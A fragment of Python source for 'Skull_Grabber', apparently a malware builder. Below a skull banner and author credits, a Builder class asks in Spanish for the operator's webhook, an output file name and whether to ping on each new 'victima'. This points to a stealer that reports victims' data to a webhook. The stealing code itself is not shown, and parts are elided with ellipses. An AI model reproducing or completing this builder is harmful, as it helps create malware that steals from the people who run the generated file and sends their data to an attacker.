...
´´´´´´´´´´´´´´´´´´´´´´¶¶¶¶´´¶¶¶¶¶´´¶¶¶¶´´´´´´´´´´´´´´´´
   ...
   ______ | (   '    /_/ Skull_Grabber (__/     /   |_______
...
class Builder:
    def __init__(self) -> None:
        ...
        print(img)
        print(Fore.WHITE)
        print(rainbowtext.text('\t\tCEO: Juankaa & Tuch0'))
        print(rainbowtext.text('\t\tDEV: Juankaa & Tuch0\n\n'))
        

        self.webhook = input(f'{Fore.YELLOW}[{Fore.RESET}+{Fore.YELLOW}]{Fore.RESET} {Fore.WHITE}Introduce tu WebHook: ')
        if not self.check_webhook(self.webhook):
            print(f"{Fore.YELLOW}[{Fore.RESET}+{Fore.YELLOW}]{Fore.RESET} {Fore.WHITE}WebHook Invalido!{Fore.RESET}")
            str(input(f"{Fore.YELLOW}[{Fore.RESET}+{Fore.YELLOW}]{Fore.RESET} Presiona cualquier tecla para salir..."))
            sys.exit()

        self.filename = input(f'{Fore.YELLOW}[{Fore.RESET}+{Fore.YELLOW}]{Fore.RESET} Introduce el nombre de el archivo: ')

        self.ping = input(f'{Fore.YELLOW}[{Fore.RESET}+{Fore.YELLOW}]{Fore.RESET} El ping de una nueva victima? (y/n): ')
        if self.ping.lower() == 'y':
            self.ping = True
            self.pingtype = input(f'{Fore.YELLOW}[{Fore.RESET}+{Fore.YELLOW}]{Fore.RESET} Tipo ping? (here/everyone): ').lower()
